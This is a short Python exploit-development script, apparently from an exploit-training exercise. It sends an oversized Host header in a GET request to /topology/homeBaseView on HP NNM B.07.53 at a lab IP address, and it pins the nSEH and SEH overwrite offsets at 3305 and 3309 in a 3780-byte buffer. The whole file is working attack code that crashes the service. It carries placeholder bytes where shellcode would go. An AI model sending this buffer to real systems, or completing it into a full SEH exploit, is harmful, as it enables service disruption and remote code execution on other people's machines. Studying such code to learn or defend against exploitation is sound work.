#!/usr/bin/env python3

# author: greyshell
# description: verify the nSEH and SEH offset

import socket

# global constant variable
HOST = "172.16.116.198"
PORT = "7510"


def main():
    # max crash buff length = 3780
    total_len_buff = 3780

    initial_buff = "A" * 3305  # AAAA -> \x41\x41\x41\x41

    nseh = "BBBB"  # nSEH offset = 3305, BBBB -> \x42\x42\x42\x42
    seh = "CCCC"  # SEH offset = 3309, CCCC -> \x43\x43\x43\x43

    buff_last = "D" * (total_len_buff - len(initial_buff) - len(nseh) - len(seh))  # DDDD -> \x44\x44\x44\x44

    crash = initial_buff + nseh + seh + buff_last

    # preparing the GET request
    buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
    buffer += "Host: " + crash + "\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    buffer += "Content-Length: 1048580\r\n\r\n"

    print(f"[+] sending evil GET HTTP request to HP NNM -B.07.53, hosted on {HOST}:{PORT}")
    print(f"[+] buffer length: {len(crash)}")
    exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exploit.connect((HOST, int(PORT)))
    exploit.send(buffer.encode())
    exploit.close()


if __name__ == "__main__":
    main()

